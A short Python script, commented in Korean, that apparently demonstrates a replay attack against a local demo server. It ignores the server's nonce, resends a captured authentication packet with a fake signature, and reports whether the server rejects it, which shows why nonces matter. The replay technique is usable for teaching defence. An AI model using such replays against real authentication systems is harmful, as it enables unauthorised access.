import socket

# 해커가 미리 가로채둔 '어제의 성공 패킷' (예시 데이터)
# 실제 시연 시에는 정상 클라이언트가 보낸 패킷을 복사해서 넣으시면 됩니다.
STOLEN_PACKET = b'\x02' + b'\x0a' + b'1234' + b'\x00\r' + b'FACE_DETECTED' + b'FAKE_SIGNATURE_STOLEN' + b'\x03'

def replay_attack():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('127.0.0.1', 8080))
    
    # 서버가 주는 새 마패(Nonce)는 무시하고, 가로챈 옛날 패킷을 그냥 쏴버림
    client_socket.recv(1024) 
    print("😈 [해커] 접속중 ...")
    client_socket.sendall(STOLEN_PACKET)

    # 서버 응답 수신
    response = client_socket.recv(1024)
    
    # 🌟 추가된 부분: 응답 결과에 따른 메시지 출력
    if response == b'\x02\x00\x03':
        print("🚩 [서버 응답]: 인증 실패! (재전송된 데이터는 사용할 수 없습니다.)")
    else:
        print(f"🚩 [서버 응답]: {response}")

    client_socket.close()

replay_attack()